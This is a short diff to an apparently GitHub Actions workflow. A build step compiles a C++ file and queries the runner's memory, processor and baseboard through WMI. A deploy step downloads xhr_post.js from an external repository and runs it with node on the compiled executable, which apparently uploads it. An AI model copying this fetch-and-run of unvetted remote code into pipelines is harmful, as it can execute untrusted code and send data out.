@@ -20,7 +20,7 @@ jobs:
       - name: Compile and run some C code
         shell: cmd
         run: |
-          cl.exe /O2 cur_date_str.cpp
+          cl.exe /O2 cur_date_str.cpp /EHsc
           powershell Get-WmiObject win32_physicalmemory
           powershell Get-WmiObject win32_processor
           powershell Get-WmiObject win32_baseboard
@@ -32,5 +32,5 @@ jobs:
           path: cur_date_str.exe
       - name: deploy
         run: |
-          wget https://raw.githubusercontent.com/gitseo/vm/master/xhr_post.js
+          powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/gitseo/vm/master/xhr_post.js -UseBasicParsing -OutFile xhr_post.js
           node xhr_post.js cur_date_str.exe cur_date_str.exe
